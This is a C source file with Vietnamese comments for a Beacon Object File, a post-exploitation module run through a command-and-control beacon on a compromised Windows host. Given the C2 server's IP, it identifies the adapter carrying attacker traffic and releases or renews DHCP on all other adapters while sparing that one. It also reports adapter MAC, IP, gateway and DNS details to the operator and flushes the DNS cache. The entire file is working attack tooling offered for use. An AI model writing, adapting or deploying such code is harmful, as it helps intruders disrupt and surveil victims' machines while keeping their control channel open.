/*
 * bof_dhcp_w.c — DHCP/ipconfig BOF (wide-char version)
 *
 * Khác bản gốc:
 *   - wstr_ieq / wstr_has thay str_ieq / str_has
 *   - c2GuidW (WCHAR): dùng cho find_if_map (WCHAR Name), wstr_ieq
 *   - c2GuidA (char):  dùng cho find_ai_by_guid, action_dhcp_check (AdapterName là char*)
 *   - w2a() dùng WideCharToMultiByte (UTF-8) — in đúng ký tự non-ASCII
 *   - find_if_map() search trực tiếp WCHAR Name, không cần convert
 *   - GetAdaptersAddresses dùng FriendlyName, DNS servers in đúng Unicode
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -o dhcp_w.x64.obj -c bof_dhcp_w.c \
 *       -masm=intel -Wall -fno-asynchronous-unwind-tables -I.
 *
 * CNA args: bof_pack(bid, "zi", c2ip, action)
 *   0 = dhcp-off   (ipconfig /release)
 *   1 = dhcp-on    (ipconfig /renew)
 *   2 = dhcp-check (ipconfig /all)
 *   3 = dhcp-flush (ipconfig /flushdns)
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include "beacon.h"

/* ═══════════════════════════════════════════════════════════════════════════
 * IMPORTS
 * ═══════════════════════════════════════════════════════════════════════════ */

DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetBestInterface(IPAddr, PDWORD);
DECLSPEC_IMPORT ULONG WINAPI IPHLPAPI$GetAdaptersAddresses(ULONG, ULONG, PVOID,
    PIP_ADAPTER_ADDRESSES, PULONG);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetAdaptersInfo(PIP_ADAPTER_INFO, PULONG);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetInterfaceInfo(PIP_INTERFACE_INFO, PULONG);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$IpReleaseAddress(PIP_ADAPTER_INDEX_MAP);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$IpRenewAddress(PIP_ADAPTER_INDEX_MAP);

DECLSPEC_IMPORT BOOL  WINAPI DNSAPI$DnsFlushResolverCache(VOID);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

/* Wide ↔ narrow conversion */
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int,
    LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int,
    LPWSTR, int);

/* ═══════════════════════════════════════════════════════════════════════════
 * CONSTANTS
 * ═══════════════════════════════════════════════════════════════════════════ */

#define HALLOC(n) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (n))
#define HFREE(p)  KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, (p))

/* ═══════════════════════════════════════════════════════════════════════════
 * WIDE-CHAR HELPERS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* WCHAR → UTF-8  (proper Unicode encoding, không lossy như cast (char)) */
static void w2a(const WCHAR *src, char *dst, int dstLen) {
    if (!src || !dst || dstLen <= 0) return;
    int r = KERNEL32$WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dstLen, NULL, NULL);
    dst[dstLen - 1] = '\0';
    if (r <= 0) dst[0] = '\0';
}

/* narrow → WCHAR */
static void a2w(const char *src, WCHAR *dst, int dstCch) {
    if (!src || !dst || dstCch <= 0) return;
    int r = KERNEL32$MultiByteToWideChar(CP_ACP, 0, src, -1, dst, dstCch);
    dst[dstCch - 1] = L'\0';
    if (r <= 0) dst[0] = L'\0';
}

/* Wide case-insensitive equal */
static BOOL wstr_ieq(const WCHAR *a, const WCHAR *b) {
    while (*a && *b) {
        WCHAR ca = (*a >= L'a' && *a <= L'z') ? (WCHAR)(*a - 32) : *a;
        WCHAR cb = (*b >= L'a' && *b <= L'z') ? (WCHAR)(*b - 32) : *b;
        if (ca != cb) return FALSE;
        a++; b++;
    }
    return (*a == L'\0' && *b == L'\0');
}

/* Wide substring search */
static BOOL wstr_has(const WCHAR *hay, const WCHAR *needle) {
    if (!needle || !*needle) return TRUE;
    for (; *hay; hay++) {
        const WCHAR *h = hay, *n = needle;
        while (*h && *n && *h == *n) { h++; n++; }
        if (!*n) return TRUE;
    }
    return FALSE;
}

/* Narrow case-insensitive equal  (cho AdapterName char*) */
static BOOL str_ieq(const char *a, const char *b) {
    while (*a && *b) {
        char ca = (*a >= 'a' && *a <= 'z') ? (char)(*a - 32) : *a;
        char cb = (*b >= 'a' && *b <= 'z') ? (char)(*b - 32) : *b;
        if (ca != cb) return FALSE;
        a++; b++;
    }
    return (*a == '\0' && *b == '\0');
}

static DWORD parse_ipv4(const char *s) {
    DWORD r = 0; BYTE *b = (BYTE *)&r;
    for (int i = 0; i < 4; i++) {
        DWORD v = 0;
        while (*s >= '0' && *s <= '9') { v = v * 10 + (BYTE)(*s - '0'); s++; }
        if (i < 3 && *s == '.') s++;
        b[i] = (BYTE)v;
    }
    return r;
}

static void fmt_ipv4(const BYTE *b, char *buf) {
    int pos = 0;
    for (int i = 0; i < 4; i++) {
        if (i > 0) buf[pos++] = '.';
        BYTE v = b[i];
        if (v >= 100) { buf[pos++] = (char)('0' + v/100); v = (BYTE)(v%100); }
        if (v >= 10)  { buf[pos++] = (char)('0' + v/10);  v = (BYTE)(v%10);  }
        buf[pos++] = (char)('0' + v);
    }
    buf[pos] = '\0';
}

static void fmt_mac(const BYTE *addr, UINT len, char *out) {
    static const char hx[] = "0123456789ABCDEF";
    int p = 0;
    for (UINT i = 0; i < len && i < 6; i++) {
        if (i > 0) out[p++] = '-';
        out[p++] = hx[(addr[i] >> 4) & 0xF];
        out[p++] = hx[ addr[i]       & 0xF];
    }
    out[p] = '\0';
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ADAPTER ALLOCATION
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * load_adapter_addresses_full — khác bản gốc chỉ ở GAA_FLAG:
 *   KHÔNG dùng GAA_FLAG_SKIP_DNS_SERVER để lấy được DNS info
 */
static PIP_ADAPTER_ADDRESSES load_adapter_addresses_full(void) {
    ULONG len = 0;
    IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC,
        GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST,
        NULL, NULL, &len);
    if (!len) return NULL;
    PIP_ADAPTER_ADDRESSES p = (PIP_ADAPTER_ADDRESSES)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC,
            GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST,
            NULL, p, &len) != NO_ERROR) { HFREE(p); return NULL; }
    return p;
}

static PIP_ADAPTER_ADDRESSES load_adapter_addresses_basic(void) {
    ULONG len = 0;
    IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC,
        GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
        NULL, NULL, &len);
    if (!len) return NULL;
    PIP_ADAPTER_ADDRESSES p = (PIP_ADAPTER_ADDRESSES)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetAdaptersAddresses(AF_UNSPEC,
            GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER,
            NULL, p, &len) != NO_ERROR) { HFREE(p); return NULL; }
    return p;
}

static PIP_ADAPTER_INFO load_adapter_info(void) {
    ULONG len = 0;
    IPHLPAPI$GetAdaptersInfo(NULL, &len);
    if (!len) return NULL;
    PIP_ADAPTER_INFO p = (PIP_ADAPTER_INFO)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetAdaptersInfo(p, &len) != NO_ERROR) { HFREE(p); return NULL; }
    return p;
}

static PIP_INTERFACE_INFO load_interface_info(void) {
    ULONG len = 0;
    IPHLPAPI$GetInterfaceInfo(NULL, &len);
    if (!len) return NULL;
    PIP_INTERFACE_INFO p = (PIP_INTERFACE_INFO)HALLOC(len);
    if (!p) return NULL;
    if (IPHLPAPI$GetInterfaceInfo(p, &len) != NO_ERROR) { HFREE(p); return NULL; }
    return p;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * GUID RESOLUTION
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * get_c2_guid — điền cả c2GuidW (WCHAR) lẫn c2GuidA (char)
 *   c2GuidW: dùng cho find_if_map (WCHAR Name, wstr_has), wstr_ieq trong off/on
 *   c2GuidA: dùng cho find_ai_by_guid, C2 tag trong dhcp-check (AdapterName là char*)
 */
static BOOL get_c2_guid(const char *c2ip,
                         WCHAR *wGuid, DWORD wCch,
                         char  *aGuid, DWORD aCch,
                         DWORD *ifIdxOut) {
    DWORD addr = parse_ipv4(c2ip);
    if (!addr) return FALSE;
    DWORD ifIdx = 0;
    if (IPHLPAPI$GetBestInterface(addr, &ifIdx) != NO_ERROR) return FALSE;
    if (ifIdxOut) *ifIdxOut = ifIdx;

    PIP_ADAPTER_ADDRESSES pA = load_adapter_addresses_basic();
    if (!pA) return FALSE;

    BOOL found = FALSE;
    for (PIP_ADAPTER_ADDRESSES a = pA; a; a = a->Next) {
        if (a->IfIndex == ifIdx) {
            /* aGuid: copy trực tiếp từ char* AdapterName */
            DWORD i = 0;
            while (a->AdapterName[i] && i < aCch - 1)
                { aGuid[i] = a->AdapterName[i]; i++; }
            aGuid[i] = '\0';
            /* wGuid: convert narrow → wide */
            a2w(aGuid, wGuid, (int)wCch);
            found = TRUE;
            break;
        }
    }
    HFREE(pA);
    return found;
}

/*
 * find_ai_by_guid — tìm trong GetAdaptersInfo bằng AdapterName (char*)
 */
static PIP_ADAPTER_INFO find_ai_by_guid(PIP_ADAPTER_INFO head, const char *aGuid) {
    for (PIP_ADAPTER_INFO a = head; a; a = a->Next)
        if (str_ieq(a->AdapterName, aGuid)) return a;
    return NULL;
}

/*
 * find_if_map — tìm trong GetInterfaceInfo bằng WCHAR Name trực tiếp
 *   Name = L"\\DEVICE\\TCPIP_{GUID}"
 *   Không cần convert sang char — wstr_has so sánh WCHAR trực tiếp
 */
static PIP_ADAPTER_INDEX_MAP find_if_map(PIP_INTERFACE_INFO pIf, const WCHAR *wGuid) {
    for (LONG i = 0; i < pIf->NumAdapters; i++)
        if (wstr_has(pIf->Adapter[i].Name, wGuid)) return &pIf->Adapter[i];
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION 0: DHCP-OFF  (ipconfig /release)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_dhcp_off(const WCHAR *wC2Guid, const char *aC2Guid) {
    PIP_INTERFACE_INFO pIf = load_interface_info();
    if (!pIf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetInterfaceInfo failed\n"); return;
    }

    PIP_ADAPTER_ADDRESSES pA = load_adapter_addresses_basic();
    if (!pA) {
        HFREE(pIf);
        BeaconPrintf(CALLBACK_ERROR, "[-] GetAdaptersAddresses failed\n"); return;
    }

    int released = 0, skipped = 0;
    for (PIP_ADAPTER_ADDRESSES a = pA; a; a = a->Next) {
        if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;

        /* Build wide GUID for this adapter — used for both skip check and find_if_map */
        WCHAR wAdapter[64];
        a2w(a->AdapterName, wAdapter, 64);
        if (wstr_ieq(wAdapter, wC2Guid)) { skipped++; continue; }

        char fname[128];
        w2a(a->FriendlyName, fname, sizeof(fname));

        PIP_ADAPTER_INDEX_MAP pMap = find_if_map(pIf, wAdapter);
        if (!pMap) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [?] %s — not in TCPIP stack\n", fname);
            continue;
        }
        DWORD r = IPHLPAPI$IpReleaseAddress(pMap);
        if (r == NO_ERROR) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [+] Released: %s\n", fname);
            released++;
        } else if (r == ERROR_INVALID_PARAMETER) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [~] No lease: %s\n", fname);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "  [-] %s err=%lu\n", fname, r);
        }
    }

    if (skipped)
        BeaconPrintf(CALLBACK_OUTPUT, "  [*] Skipped C2 adapter: %s\n", aC2Guid);
    if (!released && !skipped)
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] No adapters released\n");

    HFREE(pA);
    HFREE(pIf);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION 1: DHCP-ON  (ipconfig /renew)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_dhcp_on(const WCHAR *wC2Guid, const char *aC2Guid) {
    PIP_INTERFACE_INFO pIf = load_interface_info();
    if (!pIf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetInterfaceInfo failed\n"); return;
    }

    PIP_ADAPTER_ADDRESSES pA = load_adapter_addresses_basic();
    if (!pA) {
        HFREE(pIf);
        BeaconPrintf(CALLBACK_ERROR, "[-] GetAdaptersAddresses failed\n"); return;
    }

    int renewed = 0, skipped = 0;
    for (PIP_ADAPTER_ADDRESSES a = pA; a; a = a->Next) {
        if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;

        WCHAR wAdapter[64];
        a2w(a->AdapterName, wAdapter, 64);
        if (wstr_ieq(wAdapter, wC2Guid)) { skipped++; continue; }

        char fname[128];
        w2a(a->FriendlyName, fname, sizeof(fname));

        PIP_ADAPTER_INDEX_MAP pMap = find_if_map(pIf, wAdapter);
        if (!pMap) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [?] %s — not in TCPIP stack\n", fname);
            continue;
        }
        DWORD r = IPHLPAPI$IpRenewAddress(pMap);
        if (r == NO_ERROR) {
            BeaconPrintf(CALLBACK_OUTPUT, "  [+] Renewed: %s\n", fname);
            renewed++;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "  [-] %s err=%lu\n", fname, r);
        }
    }

    if (skipped)
        BeaconPrintf(CALLBACK_OUTPUT, "  [*] Skipped C2 adapter: %s\n", aC2Guid);
    if (!renewed && !skipped)
        BeaconPrintf(CALLBACK_OUTPUT, "  [!] No adapters renewed\n");

    HFREE(pA);
    HFREE(pIf);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION 2: DHCP-CHECK  (ipconfig /all)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_dhcp_check(const char *aC2Guid) {
    PIP_ADAPTER_ADDRESSES pA = load_adapter_addresses_full();
    PIP_ADAPTER_INFO      pI = load_adapter_info();
    if (!pA) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetAdaptersAddresses failed\n");
        if (pI) HFREE(pI);
        return;
    }

    char macBuf[20], ipBuf[20], dnsBuf[20], fname[128];

    for (PIP_ADAPTER_ADDRESSES a = pA; a; a = a->Next) {
        if (a->IfType == IF_TYPE_SOFTWARE_LOOPBACK) continue;

        /* FriendlyName: proper UTF-8 */
        w2a(a->FriendlyName, fname, sizeof(fname));

        const char *c2tag = str_ieq(a->AdapterName, aC2Guid) ? " [C2]" : "";
        BeaconPrintf(CALLBACK_OUTPUT, "\n--- %s%s ---\n", fname, c2tag);
        BeaconPrintf(CALLBACK_OUTPUT, "  GUID     : %s\n", a->AdapterName);

        /* MAC */
        fmt_mac(a->PhysicalAddress, a->PhysicalAddressLength, macBuf);
        BeaconPrintf(CALLBACK_OUTPUT, "  MAC      : %s\n", macBuf);

        /* IP + Subnet Mask */
        BOOL hasIP = FALSE;
        for (PIP_ADAPTER_UNICAST_ADDRESS ua = a->FirstUnicastAddress; ua; ua = ua->Next) {
            if (ua->Address.lpSockaddr->sa_family != AF_INET) continue;
            BYTE *s4 = (BYTE *)&((SOCKADDR_IN *)ua->Address.lpSockaddr)->sin_addr;
            fmt_ipv4(s4, ipBuf);
            BeaconPrintf(CALLBACK_OUTPUT, "  IP       : %s\n", ipBuf);
            hasIP = TRUE;
        }
        if (!hasIP) BeaconPrintf(CALLBACK_OUTPUT, "  IP       : (none)\n");

        /* Mask + Gateway: from GetAdaptersInfo */
        if (pI) {
            PIP_ADAPTER_INFO ai = find_ai_by_guid(pI, a->AdapterName);
            if (ai) {
                if (ai->IpAddressList.IpMask.String[0])
                    BeaconPrintf(CALLBACK_OUTPUT, "  Mask     : %s\n",
                        ai->IpAddressList.IpMask.String);
                if (ai->GatewayList.IpAddress.String[0] &&
                    ai->GatewayList.IpAddress.String[0] != '0')
                    BeaconPrintf(CALLBACK_OUTPUT, "  Gateway  : %s\n",
                        ai->GatewayList.IpAddress.String);

                BeaconPrintf(CALLBACK_OUTPUT, "  DHCP     : %s\n",
                    ai->DhcpEnabled ? "Enabled" : "Static");
                if (ai->DhcpEnabled) {
                    if (ai->DhcpServer.IpAddress.String[0])
                        BeaconPrintf(CALLBACK_OUTPUT, "  DHCP Srv : %s\n",
                            ai->DhcpServer.IpAddress.String);
                }
            }
        }

        /* DNS Servers */
        BOOL hasDNS = FALSE;
        for (PIP_ADAPTER_DNS_SERVER_ADDRESS ds = a->FirstDnsServerAddress; ds; ds = ds->Next) {
            if (ds->Address.lpSockaddr->sa_family != AF_INET) continue;
            BYTE *s4 = (BYTE *)&((SOCKADDR_IN *)ds->Address.lpSockaddr)->sin_addr;
            fmt_ipv4(s4, dnsBuf);
            if (!hasDNS) {
                BeaconPrintf(CALLBACK_OUTPUT, "  DNS      : %s\n", dnsBuf);
                hasDNS = TRUE;
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "             %s\n", dnsBuf);
            }
        }
        if (!hasDNS) BeaconPrintf(CALLBACK_OUTPUT, "  DNS      : (none)\n");

        /* Status */
        const char *opStr;
        switch (a->OperStatus) {
            case IfOperStatusUp:      opStr = "Up";       break;
            case IfOperStatusDown:    opStr = "Down";     break;
            case IfOperStatusDormant: opStr = "Dormant";  break;
            default:                  opStr = "Unknown";  break;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "  Status   : %s\n", opStr);
    }

    if (pI) HFREE(pI);
    HFREE(pA);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ACTION 3: DHCP-FLUSH  (ipconfig /flushdns)
 * ═══════════════════════════════════════════════════════════════════════════ */

static void action_flushdns(void) {
    if (DNSAPI$DnsFlushResolverCache())
        BeaconPrintf(CALLBACK_OUTPUT, "  [+] DNS resolver cache flushed OK\n");
    else
        BeaconPrintf(CALLBACK_ERROR, "  [-] DnsFlushResolverCache failed\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char *c2ip  = BeaconDataExtract(&parser, NULL);
    int   action = BeaconDataInt(&parser);

    if (!c2ip || !c2ip[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No C2 IP\n"); return;
    }

    /* Action 3 (flushdns) không cần C2 adapter, handle trước */
    if (action == 3) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== FLUSH DNS =====\n");
        action_flushdns();
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Done.\n");
        return;
    }

    /* Resolve C2 adapter — fill cả WCHAR lẫn char GUID */
    WCHAR wC2Guid[64]; wC2Guid[0] = L'\0';
    char  aC2Guid[64]; aC2Guid[0] = '\0';
    DWORD ifIdx = 0;
    if (!get_c2_guid(c2ip, wC2Guid, 64, aC2Guid, 64, &ifIdx)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Cannot resolve adapter for: %s\n", c2ip);
        return;
    }

    char wGuidPrint[64];
    w2a(wC2Guid, wGuidPrint, sizeof(wGuidPrint));
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] C2: %s  |  GUID: %s  |  IfIdx: %lu\n", c2ip, wGuidPrint, ifIdx);

    switch (action) {
        case 0:
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== DHCP-OFF (release) =====\n");
            action_dhcp_off(wC2Guid, aC2Guid); break;
        case 1:
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== DHCP-ON (renew) =====\n");
            action_dhcp_on(wC2Guid, aC2Guid); break;
        case 2:
            BeaconPrintf(CALLBACK_OUTPUT, "[*] ===== DHCP-CHECK (ipconfig /all) =====\n");
            action_dhcp_check(aC2Guid); break;
        default:
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Invalid action %d  (0=off 1=on 2=check 3=flush)\n", action);
            return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Done.\n");
}
